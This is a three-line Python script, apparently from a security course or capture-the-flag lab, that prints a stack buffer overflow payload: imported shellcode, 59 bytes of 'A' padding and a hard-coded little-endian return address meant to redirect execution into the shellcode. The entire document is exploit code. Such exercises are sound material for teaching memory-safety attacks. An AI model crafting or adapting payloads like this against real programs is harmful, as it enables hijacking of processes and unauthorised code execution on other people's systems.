from struct import pack
from shellcode import shellcode

print(shellcode + 'A'*59 + pack("<I", 0xbffeff4c))

